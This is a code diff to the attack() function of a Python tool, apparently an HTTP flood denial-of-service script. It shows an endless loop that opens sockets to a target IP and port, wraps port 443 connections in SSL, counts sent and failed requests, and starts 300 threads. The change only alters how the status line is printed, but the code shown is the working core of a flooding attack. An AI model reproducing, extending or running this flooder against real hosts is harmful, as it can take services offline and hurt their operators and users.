@@ -114,8 +114,6 @@ def attack():
     global req_error
     header = rqheader()
     go.wait()
-    LINE_UP = '\033[1A'
-    LINE_CLEAR = '\x1b[2K'
     while True:
         try:
             if rpath == True:
@@ -125,15 +123,13 @@ def attack():
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((ip, port))
             num_sent = num_sent + 1
-            print("[+] [Failed Request]: " + str(req_error) + " ["+ str(num_sent) + " SENT] => "+ip+":"+str(port)+path, end="\r")
-            print(LINE_CLEAR + LINE_UP,end=LINE_CLEAR)
+            sys.stdout.write("[+] [Failed Request]: " + str(req_error) + " ["+ str(num_sent) + " SENT] => "+ip+":"+str(port)+path+"\r")
+            sys.stdout.flush()
             if port == 443:
                 x = ssl.wrap_socket(s)
                 port443(x,request)
         except:
             req_error=req_error+1
-
-
 
 def build_thread():
 	for _ in range(300):
